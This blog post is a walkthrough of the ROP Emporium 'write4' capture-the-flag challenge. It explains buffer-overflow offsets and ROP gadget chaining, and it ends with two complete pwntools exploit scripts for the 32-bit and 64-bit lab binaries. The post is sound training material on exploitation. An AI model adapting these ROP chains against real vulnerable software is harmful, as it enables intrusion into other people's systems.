<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>ROP Emporium - write4 | Parro </title> <meta name="author" content="Parro "> <meta name="description" content="ROP Emporium challenge 4 - write4"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%A1&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://parroquet.github.io/blog/2022/write4/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">Parro </span></a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">About</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/hackthebox/">Hackthebox</a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">ROP Emporium - write4</h1> <p class="post-meta">December 30, 2022</p> <p class="post-tags"> <a href="/blog/2022"> <i class="fas fa-calendar fa-sm"></i> 2022 </a>   ·   <a href="/blog/tag/formatting"> <i class="fas fa-hashtag fa-sm"></i> formatting</a>   <a href="/blog/tag/links"> <i class="fas fa-hashtag fa-sm"></i> links</a>   <a href="/blog/tag/binexp"> <i class="fas fa-hashtag fa-sm"></i> binexp</a>     ·   <a href="/blog/category/rop"> <i class="fas fa-tag fa-sm"></i> ROP</a>   <a href="/blog/category/gdb"> <i class="fas fa-tag fa-sm"></i> GDB</a>   <a href="/blog/category/pwndbg"> <i class="fas fa-tag fa-sm"></i> pwndbg</a>   <a href="/blog/category/pwntools"> <i class="fas fa-tag fa-sm"></i> pwntools</a>   </p> </header> <article class="post-content"> <h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/write4.html" rel="external nofollow noopener" target="_blank">https://ropemporium.com/challenge/write4.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The aim of this challenge is to write the string “flag.txt” to an area of free memory so that the imported function <strong>print_file</strong> can be called with this argument which would print the flag. For this we need to utilise multiple ROP gadgets to build a ROP chain which can do this for us.</p> <p> </p> <p><img src="../../../assets/img/write_img/1checksec.png" alt="checksec" width="750"></p> <p>The first step is to run <strong>checksec</strong> in order to find protections. Like usual, NX in enabled and partial RELRO exists so a ROP chain is required.</p> <p> </p> <p><img src="../../../assets/img/write_img/2rabin.png" alt="rabin" width="750"></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings.</p> <p> </p> <p><img src="../../../assets/img/write_img/3sections.png" alt="sections" width="750"></p> <p>The <strong>rabin2</strong> command can then be used with the -S flag to list all the sections with addresses, virtual size and permissions. We need a writeable area of memory to store our flag.txt string with atleast 0x8 bytes of space so that the string will fit. We have two options here:</p> <ul> <li>the .got.plt section with 0x18 bytes of space</li> <li>the .data section with 0x8 bytes of space</li> </ul> <p> </p> <p><img src="../../../assets/img/write_img/7datasection.png" alt="datasection" width="750"></p> <p>After looking at both the .data section and .got.plt section within Ghidra, we can see that the .data section has 0x8 bytes worth of free, unfilled space whereas the .got.plt section has data within it. Therefore, we can copy down the .data address as our string storage point for our ROP chain.</p> <p> </p> <p><img src="../../../assets/img/write_img/4functions.png" alt="functions" width="750"></p> <p>Opening the binary in pwndbg, we can use <strong>info functions</strong> to list all the functions present in the binary. We can see similar functions from previous challenges and we can look at these further in Ghidra to see if there is anything that may help us exploit this binary.</p> <p> </p> <p><img src="../../../assets/img/write_img/5ghidramain.png" alt="ghidramain" width="750"> <img src="../../../assets/img/write_img/6ghidrauseful.png" alt="ghidrauseful" width="750"></p> <p>As we can see, the binary is very simple and we require a way to call this function with the “flag.txt” string instead of “nonexistent”.</p> <p> </p> <p><img src="../../../assets/img/write_img/8cyclic.png" alt="cyclic" width="750"></p> <p>Next, the offset needs to be found for the buffer overflow. We can find this using <strong>cyclic 100</strong> and printing this value into the binary input to see where it crashes.</p> <p> </p> <p><img src="../../../assets/img/write_img/9offset.png" alt="offset" width="750"></p> <p>As the EIP register contains “laaa”, we can use the command <strong>cyclic -l laaa</strong> to find the offset at which the buffer overflow occurs. This is 44 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/10disasuseful.png" alt="disasuseful" width="750"></p> <p>Using the <strong>disas</strong> command we can dissassemble the usefulFunction function to find the address of the <strong>print_file</strong> function. Using just the <strong>print_file</strong> function, we will require a junk return address included within our payload to impersonate the return address being set by the <strong>call</strong> instruction. We do not have to include this junk address if we use the address for the entire <strong>call print_file</strong> instruction on the left.</p> <p> </p> <p><img src="../../../assets/img/write_img/11disasgadgets.png" alt="disasgadgets" width="750"></p> <p>Looking at the usefulGadgets function, we can see a gadget - <strong>mov DWORD PTR [edi],ebp</strong> which we can use to move the value in ebp into the address at edi. This is useful as we can use this to move the address of the .data section into edi and then move the string “flag.txt” into ebp. This will then write the string into the .data section. We can then call the <strong>print_file</strong> instruction with the address of the .data section as the argument to print the flag. This is the goal written in the description for this challenge.</p> <p> </p> <p><img src="../../../assets/img/write_img/13ropgadget.png" alt="ropgadget" width="750"></p> <p>We then need a way to populate ebp and edi registers so that the mov gadget will work. For this we need to search for a gadget. We can use the <strong>ROPgadget</strong> command to search for a gadget that will pop ebp and edi into the registers and then return. We can see that the gadget <strong>pop edi; pop ebp; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/14order.png" alt="order" width="750"></p> <p>Now that we have all the building blocks to solve this challenge, we need to put them in the correct order so that our payload does as we wish. The order is shown above where we first populate the memory location of the .data section with the string “flag” and then repeat what we did for the remaining 4 bytes of the string - “.txt”. Keep in mind, we need to do this string separately because 32 bit architecture does things in blocks of 4 bytes. Additionally, each string will need to be reversed within our ROP chain as when writing to memory, the bytes are written in reverse order.</p> <p> </p> <p><img src="../../../assets/img/write_img/15scriptexecution.png" alt="scriptexecution" width="750"></p> <p>Instead of manually writing out addresses, we can put this into a python3 script using pwntools to solve the challenge. The script used is displayed at the end of the post as usual.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit architecture handles arguments for calls differently to 32 bit so our exploit will look slightly different. We also do not need to handle the string in blocks of 4 bytes as 64 bit architecture increases this to 8 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/18usefulFunc.png" alt="usefulFunc" width="750"></p> <p>Looking at the <strong>usefulFunction</strong> function within the 64 bit binary, we can see the address for the <strong>print_file</strong> function we need to call.</p> <p> </p> <p><img src="../../../assets/img/write_img/19disasusefulGadget.png" alt="disasusefulGadget" width="750"></p> <p>Looking at the <strong>usefulGadgets</strong> function, we can see a different gadget to before - <strong>mov QWORD PTR [r14],r15 ; ret</strong>. This is useful as it tells us that we can move a quad word - 16 bytes worth of string into the address held in the r14 register. We can copy down the address for this.</p> <p> </p> <p><img src="../../../assets/img/write_img/17ropgadgetpop.png" alt="ropgadgetpop" width="750"></p> <p>In order to populate the r14 and r15 registers, we need to search for a gadget which will pop r14 and r15 into the registers and then return. We can use the <strong>ROPgadget</strong> command to search for a gadget that will do this. We can see that the gadget <strong>pop r14; pop r15; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/20datasection.png" alt="datasection" width="750"></p> <p>We need to find the .data section which we know is writable and can store our 0x8 bytes of stirng. Within pwndbg, the command <strong>info target</strong> to list all the sections of the binary. We find the address of the .data section and the address can be noted.</p> <p> </p> <p>64bit: <img src="../../../assets/img/split_img/1464bitarguments.png" alt="1464bitarguments" width="750"> <img src="../../../assets/img/write_img/21fillparam.png" alt="fillparam" width="750"></p> <p>As seen before in previous challenges, the 64 bit architecture requires the arguments to be passed in the registers seen above. This means that we need to use a ROP gadget which is <strong>pop rdi; ret</strong> to populate the rdi register with the address of the .data section so that we can use the <strong>print_file</strong> function and print the flag. We can use the <strong>ROPgadget</strong> command to search for a gadget that will do this shown above. We can see that the gadget <strong>pop rdi; ret</strong> exists so we can copy down its address.</p> <p> </p> <p><img src="../../../assets/img/write_img/22cyclic.png" alt="cyclic" width="750"></p> <p>Before we create our exploit, we need an offset. We can do this via the <strong>cyclic 100</strong> command and then copying the pattern into the input field of the running program. The first 8 bytes of the RSP register can then be used to find the offset to make the buffer overflow successful.</p> <p> </p> <p><img src="../../../assets/img/write_img/23offset.png" alt="offset" width="750"></p> <p>We can use the command <strong>cyclic -l faaaaaaa</strong> to find the offset. We can see that the offset is 40 bytes.</p> <p> </p> <p><img src="../../../assets/img/write_img/24order.png" alt="order" width="750"></p> <p>Finally, the order for the exploit can be created. Firstly, we need to fill the offset with junk ‘A’ values. We then want to populate the .data section with our string. We pop the two values for the .data section address and flag.txt string from the stack into the r14 and r15 registers accordingly. The mov gadget can then be used to write this string to the .data section. The last 3 instructions are in charge of printing the flag where we will first populate the rdi register to set an argument for the <strong>print_file</strong> function and then we call the <strong>print_file</strong> function.</p> <p> </p> <p><img src="../../../assets/img/write_img/25scriptexecution.png" alt="scriptexecution" width="750"></p> <p>Instead of manually writing out addresses, we can put this into a python3 script using pwntools to solve the challenge. The script used is displayed at the end of the post as usual.</p> <p> </p> <h3 id="the-32-bit-python-script">The 32 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./write432'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="c1"># Address needed to put parameters in registers
</span><span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0804a018</span>
<span class="n">mov_gadget</span> <span class="o">=</span> <span class="mh">0x08048543</span>
<span class="n">pop_gadget</span> <span class="o">=</span> <span class="mh">0x080485aa</span>
<span class="n">flagstr</span> <span class="o">=</span> <span class="mh">0x67616C66</span>
<span class="n">txtstr</span> <span class="o">=</span> <span class="mh">0x7478742E</span>    <span class="c1"># writing text to memory requires little endian so it can be converted to big
</span><span class="n">print_file</span> <span class="o">=</span> <span class="mh">0x080483d0</span>
<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x61616161</span>

<span class="c1"># junkaddr is needed as we are calling the function print_file, we don't need this
# if we use the address of "call print_file@plt" instead of "print_file@plt" as
# the functionality of call is then done for us (writing return address to stack)
</span>
<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x08048538</span>

<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov DWORD[edi], ebp"</span><span class="p">,</span> <span class="n">mov_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop edi ; pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x flag string"</span><span class="p">,</span> <span class="n">flagstr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x .txt string"</span><span class="p">,</span> <span class="n">txtstr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x print_file function"</span><span class="p">,</span> <span class="n">print_file</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>

<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>



<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="c1"># Print out the address of EIP at the time of crashing
</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
<span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">flagstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># +4 so that we don't overwrite our "flag" string
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">txtstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">print_file</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> <p> </p> <h3 id="the-64-bit-python-script">The 64 bit python script</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./write4'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x0000000000400620</span>
<span class="n">mov_qword_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400628</span>
<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400693</span>
<span class="n">pop_r14_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400690</span>
<span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0000000000601028</span>
<span class="n">flagtxtstr</span> <span class="o">=</span> <span class="mh">0x7478742E67616C66</span>


<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov QWORD PTR [r14],r15"</span><span class="p">,</span> <span class="n">mov_qword_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi ; ret"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop 14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r14_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x flag.txt string"</span><span class="p">,</span> <span class="n">flagtxtstr</span><span class="p">)</span>


<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>

<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="c1"># Note that we have to call pop_rdi gadget here
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flagtxtstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_qword_gadget</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> </article> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2023 Parro . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="/assets/js/common.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>